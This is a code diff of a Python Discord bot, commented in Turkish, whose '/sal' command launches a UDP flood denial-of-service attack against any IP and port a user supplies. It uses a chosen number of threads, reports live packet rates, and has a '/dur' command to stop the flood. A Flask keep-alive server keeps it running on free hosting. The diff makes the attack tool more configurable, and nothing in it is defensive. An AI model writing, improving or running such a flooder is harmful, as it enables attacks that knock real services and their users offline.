@@ -9,66 +9,68 @@ from dotenv import load_dotenv
 from flask import Flask
 from threading import Thread
 
-# .env dosyasini yukle
 load_dotenv()
 
 intents = discord.Intents.default()
-intents.message_content = True
 bot = commands.Bot(command_prefix="!", intents=intents)
 
-stop_flags = {}
+stop_event = threading.Event()
+sent = 0
+lock = threading.Lock()
 
-def flood_worker(ip, port, duration, stop_event):
+def flood(target, port):
+    global sent
     sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    # Render'da maksimum verim icin 1024 byte
     payload = os.urandom(1024)
-    end_time = time.time() + duration
-    while time.time() < end_time and not stop_event.is_set():
+    while not stop_event.is_set():
         try:
-            sock.sendto(payload, (ip, port))
+            sock.sendto(payload, (target, port))
+            with lock:
+                sent += 1
         except:
             pass
     sock.close()
 
 @bot.event
 async def on_ready():
-    print(f"[*] {bot.user} olarak giris yapildi. Bot hazir!")
+    print(f"[*] {bot.user} olarak giris yapildi.")
     await bot.tree.sync()
 
-@bot.tree.command(name="sal", description="Saldiri baslatir")
-async def sal(interaction: discord.Interaction, ip: str, port: int, saniye: int):
-    await interaction.response.send_message(f"🚀 **Saldiri baslatildi!**\nHedef: `{ip}:{port}`\nSure: `{saniye}` saniye.", ephemeral=False)
+@bot.tree.command(name="sal", description="UDP Flood baslatir")
+async def sal(interaction: discord.Interaction, ip: str, port: int, saniye: int, thread: int):
+    global sent
+    await interaction.response.send_message(f"🚀 **Saldiri baslatildi!**\nHedef: `{ip}:{port}`\nSure: `{saniye}` sn | Thread: `{thread}`", ephemeral=False)
     
-    stop_event = threading.Event()
-    stop_flags[ip] = stop_event
+    stop_event.clear()
+    sent = 0
     
-    # Render ucretsiz plan limitlerini asmamak icin 200 thread
-    for _ in range(200):
-        t = threading.Thread(target=flood_worker, args=(ip, port, saniye, stop_event), daemon=True)
+    for _ in range(thread):
+        t = threading.Thread(target=flood, args=(ip, port), daemon=True)
         t.start()
 
+    # Istatistikleri guncelle
+    start_time = time.time()
+    while time.time() - start_time < saniye and not stop_event.is_set():
+        await discord.utils.sleep_until(discord.utils.utcnow() + discord.utils.timedelta(seconds=1))
+        elapsed = time.time() - start_time
+        pps = sent / elapsed if elapsed > 0 else 0
+        await interaction.edit_original_response(content=f"🚀 **Saldiri devam ediyor!**\nHedef: `{ip}:{port}`\nGiden: `{sent}` paket | `~{pps:.0f} pps`\nKalan: `{int(saniye - elapsed)}` sn")
+
+    stop_event.set()
+    await interaction.edit_original_response(content=f"🛑 **Saldiri bitti!**\nHedef: `{ip}:{port}`\nToplam giden: `{sent}` paket.")
+
 @bot.tree.command(name="dur", description="Saldiriyi durdurur")
-async def dur(interaction: discord.Interaction, ip: str):
-    if ip in stop_flags:
-        stop_flags[ip].set()
-        await interaction.response.send_message(f"🛑 `{ip}` adresine yapilan saldiri durduruldu.")
-    else:
-        await interaction.response.send_message("Bu IP icin aktif bir saldiri bulunamadi.", ephemeral=True)
+async def dur(interaction: discord.Interaction):
+    stop_event.set()
+    await interaction.response.send_message("🛑 Saldiri durduruldu.")
 
-# Render'in botu kapatmamasi icin sahte web sunucusu
+# Render'in uyumamasi icin Flask
 app = Flask('')
-
 @app.route('/')
-def home():
-    return "Bot aktif ve calisiyor!"
-
-def run_web_server():
-    app.run(host='0.0.0.0', port=8080)
-
-def keep_alive():
-    t = Thread(target=run_web_server)
-    t.start()
+def home(): return "Bot aktif!"
+def run(): app.run(host='0.0.0.0', port=8080)
+def keep_alive(): Thread(target=run).start()
 
 if __name__ == "__main__":
-    keep_alive() # Web sunucusunu baslat
-    bot.run(os.getenv("DISCORD_TOKEN")) # Token'i .env'den al
+    keep_alive()
+    bot.run(os.getenv("DISCORD_TOKEN"))
